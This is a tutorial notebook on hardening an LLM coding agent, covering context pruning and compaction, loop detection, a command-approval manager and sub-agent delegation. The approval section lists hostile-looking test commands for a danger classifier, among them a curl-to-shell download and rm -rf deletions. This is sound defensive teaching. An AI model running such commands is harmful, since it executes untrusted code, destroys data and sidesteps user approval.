# Hardening the Agent

A working agentic loop ([NB03](/notebooks/apps/cda/03-agent.html)) is the foundation, but a production-quality agent needs additional safeguards. Long coding sessions exhaust the model's context window. Buggy code causes the agent to retry the same failing operation endlessly. And unfettered write access to a filesystem demands an approval layer before any irreversible command runs.

This notebook hardens the agent across five dimensions: **context management** tracks token usage and prunes stale messages before the window fills; **compaction** uses the LLM itself to compress history into a concise summary; **loop detection** identifies repetitive patterns and breaks them before they waste budget; an **approval system** classifies every tool invocation as safe, suspicious, or dangerous; and **sub-agent orchestration** delegates well-scoped sub-tasks to isolated child agents so the main agent's context stays focused.

## Context Management

Every model has a finite context window — the total number of tokens it can attend to at once. For `claude-sonnet-4`, the limit is $200{,}000$ tokens. A long coding session accumulates user messages, assistant reasoning, tool calls, and tool results rapidly. Hit the limit and the API returns an error; approach it and the model's effective attention degrades as early conversation recedes into irrelevance.

`ContextManager` in `context.py` addresses this with two graduated responses. At $80\%$ usage (`needs_compaction`) it requests LLM-based summarization — a smarter intervention that preserves meaning. At $90\%$ usage (`needs_pruning`) it falls back to mechanical deletion — a blunter but guaranteed-to-work approach. The token count is updated after each LLM call from the `prompt_tokens` field of the API's usage object, which reflects what the model actually saw.

Importing the `ContextManager` and inspecting its thresholds:

In [ ]:
from notebooks.agent.config import Config
from notebooks.agent.context import ContextManager
from notebooks.agent.events import TokenUsage

config = Config()
ctx = ContextManager(config)

print(f"Context window : {ctx.config.context_window:,} tokens")
print(f"Compaction at  : {ctx.compaction_threshold*100:.0f}%  ({int(ctx.compaction_threshold * ctx.config.context_window):,} tokens)")
print(f"Pruning at     : {ctx.pruning_threshold*100:.0f}%  ({int(ctx.pruning_threshold * ctx.config.context_window):,} tokens)")
print(f"Keep last      : {ctx.keep_last} messages")

**Token tracking.** `update_token_count` is called after every LLM response using the `prompt_tokens` from the API's usage object. We simulate three sequential calls, each reporting a rising token count:

In [ ]:
for tokens in [50_000, 160_000, 182_000]:
    usage = TokenUsage(prompt_tokens=tokens, completion_tokens=500, total_tokens=tokens + 500)
    ctx.update_token_count(usage)
    stats = ctx.get_context_stats()
    flag = ""
    if stats["needs_pruning"]:
        flag = "  ← PRUNE"
    elif stats["needs_compaction"]:
        flag = "  ← compact"
    print(
        f"{tokens:>9,} tokens  ({stats['usage_percent']:5.1f}%)  "
        f"compact={stats['needs_compaction']}  prune={stats['needs_pruning']}{flag}"
    )

**Token estimation.** When deciding which messages to prune, `ContextManager` needs a fast per-message estimate without calling a tokenizer. The heuristic `len(content) // 4 + 10` approximates the GPT rule-of-thumb of $\approx 4$ characters per token, plus $10$ tokens of overhead for role and formatting metadata:

In [ ]:
messages = [
    {"role": "user",      "content": "Fix the bug in authentication."},
    {"role": "assistant", "content": "I'll investigate the auth module." + " x" * 200},
    {"role": "tool",      "content": "<file contents>" + "A" * 4000},
]

for msg in messages:
    est = ContextManager.estimate_message_tokens(msg)
    print(f"role={msg['role']:<10}  content_len={len(msg['content']):>5}  est_tokens={est}")

**Pruning strategy.** `prune_messages` always preserves (1) the system message at index $0$ and (2) the last `keep_last` messages. Among the "middle" messages it removes tool results first — these are typically the largest — then drops old assistant messages from the front until the estimated total falls below the compaction threshold. We simulate a long conversation and observe the reduction:

In [ ]:
import json

# Build a synthetic 30-message history.
# system + 14 exchange turns (user/assistant pairs) + 1 big tool result in the middle
sim_messages = [{"role": "system", "content": "You are a coding agent."}]

for i in range(7):
    sim_messages.append({"role": "user",      "content": f"Task {i}: do something useful."})
    sim_messages.append({"role": "assistant", "content": f"Working on task {i}." + " reasoning " * 50})
    # Attach a large tool result every other turn
    if i % 2 == 0:
        sim_messages.append({"role": "tool", "content": "FILE_CONTENT: " + "x" * 3000,
                              "tool_call_id": f"call_{i}"})

# Add recent tail messages
for j in range(5):
    sim_messages.append({"role": "user",      "content": f"Recent task {j}."})
    sim_messages.append({"role": "assistant", "content": f"Completing recent task {j}."})

before = len(sim_messages)
before_tokens = sum(ContextManager.estimate_message_tokens(m) for m in sim_messages)

# Reset to a lower context window to trigger pruning
small_config = Config()
small_config.model.context_window = 2_000
pruner = ContextManager(small_config)

pruned = pruner.prune_messages(sim_messages)
after = len(pruned)
after_tokens = sum(ContextManager.estimate_message_tokens(m) for m in pruned)

print(f"Before pruning : {before:>3} messages  (~{before_tokens:,} est. tokens)")
print(f"After pruning  : {after:>3} messages  (~{after_tokens:,} est. tokens)")
print()
print("Roles after pruning:")
for m in pruned:
    print(f"  {m['role']:<10}  {str(m['content'])[:60]}")

The system message survives intact, tool results from the middle are removed first (they had $3{,}000$-character payloads), and the last $10$ messages are always preserved verbatim.

## Context Compaction

Mechanical pruning is lossy — it discards messages entirely, dropping context that may still be relevant. `ChatCompactor` in `compaction.py` takes a smarter approach: it asks the LLM to *summarize* the middle portion of the conversation into a concise digest, then replaces those messages with a single `[Context Summary]` user message. The system prompt and the most recent `keep_last` messages are always preserved verbatim.

The resulting message list has the structure `[system_msg, summary_msg, ...tail]` — typically much shorter than the original, but semantically richer than blind deletion.

**Summarization prompt.** Before calling the LLM, `_build_summarization_prompt` formats each message as `[role]: content` and truncates payloads longer than $2{,}000$ characters. We can inspect the prompt without making an actual LLM call:

In [ ]:
from notebooks.agent.compaction import ChatCompactor, _SUMMARIZER_SYSTEM_PROMPT, _MAX_MESSAGE_CHARS

print(f"Summarizer system prompt ({len(_SUMMARIZER_SYSTEM_PROMPT)} chars):")
print()
print(_SUMMARIZER_SYSTEM_PROMPT)

**Prompt construction.** We build a dummy `ChatCompactor` and call `_build_summarization_prompt` directly on a small message slice:

In [ ]:
# Build a dummy compactor — we only call the pure method, no LLM client needed
class _DummyClient: pass

compactor = ChatCompactor.__new__(ChatCompactor)
compactor.client = _DummyClient()
compactor.config = Config()

sample_middle = [
    {"role": "user",      "content": "Add type hints to utils.py"},
    {"role": "assistant", "content": "I'll read utils.py first.",
     "tool_calls": [{"function": {"name": "read_file"}}]},
    {"role": "tool",      "content": "def helper(x): return x * 2\n" * 30,
     "tool_call_id": "call_001"},
    {"role": "assistant", "content": "Done — added type hints to all 12 functions."},
]

prompt_msgs = compactor._build_summarization_prompt(sample_middle)

print(f"Prompt message count : {len(prompt_msgs)}")
print(f"System role          : {prompt_msgs[0]['role']}")
print(f"User role            : {prompt_msgs[1]['role']}")
print()
print("User message (first 400 chars):")
print(prompt_msgs[1]["content"][:400])

**`compact()` interface.** When called on a real `ChatCompactor`, `compact(messages, keep_last=10)` returns:

- `messages[0]` — the system message, unchanged.
- A single `{"role": "user", "content": "[Context Summary]\n\n...\n\n[End of Summary...]"}` message.
- `messages[-keep_last:]` — the tail verbatim.

The summary message is produced by a separate non-streaming LLM call (`stream=False`). On completion, a `StreamEventType.MESSAGE_COMPLETE` event carries the full response in `event.text_delta.content`.

:::{.callout-note}
Compaction triggers first (at $80\%$ usage) precisely because it is semantically aware. Pruning ($90\%$) is the emergency fallback: it runs even when the LLM call for compaction itself fails, ensuring the agent never crashes on a context-limit error.

:::

## Loop Detection

An agent can get stuck. A common failure mode: the model reads an error, attempts a fix, gets the same error, attempts the same fix, and repeats indefinitely. Each turn consumes tokens and API budget while making no progress. `LoopDetector` in `loop_detector.py` catches this by maintaining a rolling window of the last $10$ action **signatures** — MD5 hashes of `"action_name:sorted_params_json"` — and flagging patterns before they drain the session.

Two checks are available: `is_looping()` flags when the most recent signature appears $\geq 3$ times in the window (simple repetition), and `detect_cycle(min, max)` finds alternating patterns of length $2$–$5$ that repeat at least twice consecutively at the tail.

**Simple repetition.** We record a sequence that includes a repeated `shell` call to observe `is_looping()`:

In [ ]:
from notebooks.agent.loop_detector import LoopDetector

detector = LoopDetector(max_repeats=3, window_size=10)

actions = [
    ("read_file",   {"path": "src/main.py"}),
    ("shell",       {"command": "python -m pytest tests/"}),
    ("edit_file",   {"path": "src/main.py", "old": "return x", "new": "return x + 1"}),
    ("shell",       {"command": "python -m pytest tests/"}),   # second occurrence
    ("shell",       {"command": "python -m pytest tests/"}),   # third — loop!
]

for action, params in actions:
    detector.record(action, params)
    print(f"  record({action!r:<12})  is_looping={detector.is_looping()}")

**Cycle detection.** `detect_cycle` catches more subtle alternating loops — e.g. an agent that alternates between two failing strategies:

In [ ]:
detector2 = LoopDetector(max_repeats=3, window_size=12)

# One-off setup actions
detector2.record("read_file",  {"path": "src/auth.py"})
detector2.record("shell",      {"command": "git status"})

# Alternating cycle of length 2: edit_file → shell → edit_file → shell ...
cycle_actions = [
    ("edit_file", {"path": "src/auth.py", "old": "foo", "new": "bar"}),
    ("shell",     {"command": "python -m pytest tests/auth_test.py"}),
] * 3   # repeat the pair 3 times

for action, params in cycle_actions:
    detector2.record(action, params)

cycle = detector2.detect_cycle()
print(f"Cycle detected : {cycle is not None}")
if cycle:
    print(f"Cycle length   : {len(cycle)} signatures")
    print()
    print("Loop message injected into conversation:")
    print(detector2.get_loop_message())

**Reset.** After the agent tries a different approach, the detector is reset so a fresh strategy does not inherit the loop count from the old one:

In [ ]:
detector2.reset()
detector2.record("read_file", {"path": "src/auth.py"})

print(f"After reset — is_looping  : {detector2.is_looping()}")
print(f"After reset — detect_cycle: {detector2.detect_cycle()}")

## Approval System

A coding agent has real-world write access: it can delete files, run arbitrary shell commands, and make network requests. Exposing these capabilities without a gatekeeping layer means a confused model or a prompt-injection attack can cause irreversible damage.

`ApprovalManager` in `safety.py` is a lightweight decision layer — it does not show UI, it only answers the question: *does this invocation need user approval before executing?* The answer depends on the configured `ApprovalPolicy`:

| Policy | Behavior |
|---|---|
| `ON_REQUEST` | Approval required for all WRITE / SHELL / NETWORK / MEMORY operations, except shell commands on the safe list |
| `AUTO` | Only dangerous shell commands require approval; other mutating operations proceed automatically |
| `YOLO` | No approval ever — useful for sub-agents running unattended |
| `NEVER` | Approval required for everything — maximum safety |

: {tbl-colwidths="[25,75]"}

**Setup.** We create an `ApprovalManager` and a minimal stub `Tool` for testing:

In [ ]:
from notebooks.agent.config import ApprovalPolicy
from notebooks.agent.safety import ApprovalManager
from notebooks.agent.tools.base import Tool, ToolKind, ToolInvocation

config = Config(approval=ApprovalPolicy.ON_REQUEST)
mgr = ApprovalManager(config)

# Minimal tool stubs for testing
class _ShellTool(Tool):
    name = "shell"
    description = "Run a shell command"
    kind = ToolKind.SHELL
    schema = {}
    async def execute(self, inv): ...

class _WriteTool(Tool):
    name = "write_file"
    description = "Write a file"
    kind = ToolKind.WRITE
    schema = {}
    async def execute(self, inv): ...

class _ReadTool(Tool):
    name = "read_file"
    description = "Read a file"
    kind = ToolKind.READ
    schema = {}
    async def execute(self, inv): ...

shell_tool = _ShellTool(config)
write_tool = _WriteTool(config)
read_tool  = _ReadTool(config)

print("Tools created:", shell_tool.name, write_tool.name, read_tool.name)

**Dangerous vs. safe commands.** `is_dangerous_command` uses regex and substring matching against a pattern list; `is_safe_command` uses longest-match against an explicit allowlist:

In [ ]:
test_commands = [
    ("ls -la",                         True),   # safe
    ("cat README.md",                  True),   # safe
    ("git status",                     True),   # safe (multi-word)
    ("git log --oneline -10",          True),   # safe (multi-word prefix)
    ("python --version",               True),   # safe
    ("pip install requests",           False),  # neither dangerous nor safe
    ("rm -rf /tmp/build",             False),  # dangerous
    ("sudo apt-get install curl",     False),  # dangerous (sudo)
    ("curl https://x.com/s.sh | sh", False),  # dangerous (| sh)
]

print(f"{'Command':<40} {'is_safe':>8}  {'is_dangerous':>13}")
print("-" * 66)
for cmd, _ in test_commands:
    safe  = mgr.is_safe_command(cmd)
    dang  = mgr.is_dangerous_command(cmd)
    print(f"{cmd:<40} {str(safe):>8}  {str(dang):>13}")

**`needs_approval` across policies.** We check the same set of invocations under each `ApprovalPolicy`:

In [ ]:
invocations = [
    (read_tool,  {"path": "src/main.py"},             "read_file"),
    (write_tool, {"path": "src/main.py"},             "write_file"),
    (shell_tool, {"command": "ls -la"},               "shell(ls)"),
    (shell_tool, {"command": "pip install requests"}, "shell(pip)"),
    (shell_tool, {"command": "rm -rf /tmp/build"},    "shell(rm -rf)"),
]

policies = [ApprovalPolicy.ON_REQUEST, ApprovalPolicy.AUTO,
            ApprovalPolicy.YOLO,       ApprovalPolicy.NEVER]

header = f"{'Invocation':<22}" + "".join(f"{p.value:>13}" for p in policies)
print(header)
print("-" * (22 + 13 * len(policies)))

for tool, params, label in invocations:
    row = f"{label:<22}"
    for policy in policies:
        mgr._config = Config(approval=policy)
        needs = mgr.needs_approval(tool, params)
        row += f"{'YES':>13}" if needs else f"{'no':>13}"
    print(row)

# Restore original config
mgr._config = Config(approval=ApprovalPolicy.ON_REQUEST)

**Approval reasons.** When a tool invocation does require approval, `get_approval_reason` produces a human-readable explanation suitable for display in the approval dialog:

In [ ]:
approval_cases = [
    (shell_tool, {"command": "rm -rf /tmp"}),
    (shell_tool, {"command": "sudo systemctl restart nginx"}),
    (shell_tool, {"command": "pip install requests"}),
    (write_tool, {"path": "src/config.py"}),
]

for tool, params in approval_cases:
    reason = mgr.get_approval_reason(tool, params)
    print(f"{str(params):<45}  →  {reason}")

:::{.callout-caution}
`ApprovalManager` is a UX guardrail, not a security sandbox. A sufficiently creative shell command can evade the pattern list. For true isolation, run the agent inside a container or a restricted VM and rely on OS-level permissions rather than substring matching.

:::

## Sub-Agent Orchestration

A single long-running agent accumulates everything in one context window: investigation, reasoning, edits, test runs, and documentation. This is fragile — the model's attention is split, context fills quickly, and a single misstep in the middle pollutes all subsequent reasoning.

The **orchestrator pattern** solves this by decomposing the task. A coordinator agent breaks work into well-scoped sub-tasks and delegates each to a focused **sub-agent** running in an isolated `Session` with its own fresh context. Sub-agents report their findings back as a single tool result; the coordinator folds those results into its reasoning and assigns the next sub-task. Each sub-agent stays focused, uses fewer tokens, and cannot contaminate the coordinator's context with irrelevant details.

`SubAgentTool` in `tools/subagents.py` implements this delegation as a regular tool. The model calls `run_sub_agent(task=..., role=...)` just like any other tool, and the runtime spawns a child `Agent` with `approval=YOLO` (it runs unattended) and the role's specialized system prompt.

**Built-in roles.** Five pre-defined roles cover the most common sub-tasks. Each ships with a focused system prompt and, optionally, a restricted tool set:

In [ ]:
from notebooks.agent.tools.subagents import BUILTIN_ROLES

print(f"{'Role':<25}  {'Allowed tools':<55}")
print("-" * 82)
for role, (prompt, tools) in BUILTIN_ROLES.items():
    tools_str = ", ".join(tools) if tools else "(all tools)"
    print(f"{role:<25}  {tools_str:<55}")

**System prompts.** Each role's prompt specializes behavior. Here are the prompts for two representative roles:

In [ ]:
for role in ("codebase_investigator", "code_reviewer"):
    prompt, tools = BUILTIN_ROLES[role]
    print(f"=== {role} ===")
    print(prompt)
    print()

**Tool schema.** `SubAgentTool` exposes its interface to the LLM through the standard OpenAI function-calling schema. We instantiate it and inspect what the model sees:

In [ ]:
import json
from notebooks.agent.tools.subagents import SubAgentTool

sub_tool = SubAgentTool(Config())
schema = sub_tool.to_openai_schema()

print(f"Tool name    : {schema['name']}")
print(f"Description  : {schema['description']}")
print()
print("Parameters:")
for param, spec in schema["parameters"]["properties"].items():
    desc = spec.get("description", "")[:80]
    print(f"  {param:<16}  {spec.get('type', 'any'):<8}  {desc}")

**`SubAgentParams` defaults.** All parameters except `task` have sensible defaults, so the model can call the tool with just a task description and a role name:

In [ ]:
from notebooks.agent.tools.subagents import SubAgentParams

params = SubAgentParams(task="Find all usages of the deprecated `auth_v1` function.")

print(f"task          : {params.task}")
print(f"role          : {params.role}")
print(f"system_prompt : {params.system_prompt}")
print(f"allowed_tools : {params.allowed_tools}")
print(f"max_turns     : {params.max_turns}")

**`execute()` flow.** When the tool fires, `SubAgentTool.execute` performs the following steps:

1. `_resolve_role(params)` — looks up the built-in role, or validates the custom prompt.
2. `_build_child_config(...)` — creates a `Config` copy with `approval=YOLO`, `max_turns` override, and `developer_instructions=role_prompt`.
3. Builds a fresh `Session` and overrides its system message with the role prompt.
4. Creates a child `Agent` and calls `child_agent.run(task)`, collecting `AgentEventType.TEXT_COMPLETE` events.
5. `_format_output(...)` wraps the response in a `[Sub-agent result | role=...]` header and returns a `ToolResult`.

The parent agent receives the output as a normal tool result and can reason over it in the same turn.

**Dry-run: resolving a role.** We call `_resolve_role` directly to verify that the right prompt and tool list are returned for two role types:

In [ ]:
# Built-in role
p1 = SubAgentParams(task="Review the PR diff.", role="code_reviewer")
prompt1, tools1 = sub_tool._resolve_role(p1)
print("code_reviewer")
print(f"  allowed_tools : {tools1}")
print(f"  prompt[:80]   : {prompt1[:80]}")
print()

# Custom role
p2 = SubAgentParams(
    task="Audit all SQL queries for injection vulnerabilities.",
    role="custom",
    system_prompt="You are a security auditor. Focus on SQL injection risks.",
    allowed_tools=["read_file", "grep"],
)
prompt2, tools2 = sub_tool._resolve_role(p2)
print("custom role")
print(f"  allowed_tools : {tools2}")
print(f"  prompt[:80]   : {prompt2[:80]}")

**Child config.** The child `Config` inherits model settings and working directory from the parent, hard-codes `approval=YOLO` so the sub-agent never blocks waiting for user input, and sets `developer_instructions=role_prompt` so the role is embedded in config as well as overridden directly on the session's first message:

In [ ]:
parent_config = Config(approval=ApprovalPolicy.ON_REQUEST, max_turns=100)
parent_tool   = SubAgentTool(parent_config)

p3 = SubAgentParams(task="Write tests for utils.py.", role="test_writer", max_turns=20)
prompt3, tools3 = parent_tool._resolve_role(p3)
child_cfg = parent_tool._build_child_config(p3, prompt3, tools3)

print(f"Parent approval : {parent_config.approval}")
print(f"Child  approval : {child_cfg.approval}")
print(f"Child  max_turns: {child_cfg.max_turns}")
print(f"Child  model    : {child_cfg.model_name}")
print(f"Child  cwd      : {child_cfg.cwd}")

## Summary

| Component | File | Purpose | Key Methods |
|---|---|---|---|
| `ContextManager` | `context.py` | Track token usage; trigger pruning or compaction before the context window fills | `update_token_count`, `needs_compaction`, `needs_pruning`, `prune_messages`, `get_context_stats` |
| `ChatCompactor` | `compaction.py` | Replace middle-portion of conversation with an LLM-generated summary | `compact`, `_build_summarization_prompt`, `_summarize` |
| `LoopDetector` | `loop_detector.py` | Detect repeated or cycling action patterns in the agent's behavior window | `record`, `is_looping`, `detect_cycle`, `get_loop_message`, `reset` |
| `ApprovalManager` | `safety.py` | Decide whether a tool invocation requires user approval based on policy and command safety | `needs_approval`, `is_dangerous_command`, `is_safe_command`, `get_approval_reason` |
| `SubAgentTool` | `tools/subagents.py` | Spawn a focused child agent for a scoped sub-task; fold its output into the parent's context | `execute`, `_resolve_role`, `_build_child_config`, `_format_output` |

: {tbl-colwidths="[18,20,38,24]"}

<br>

← [The Agent Loop](/notebooks/apps/cda/03-agent.html) &emsp; → [Configuration Loading](/notebooks/apps/cda/05-config.html)

---

■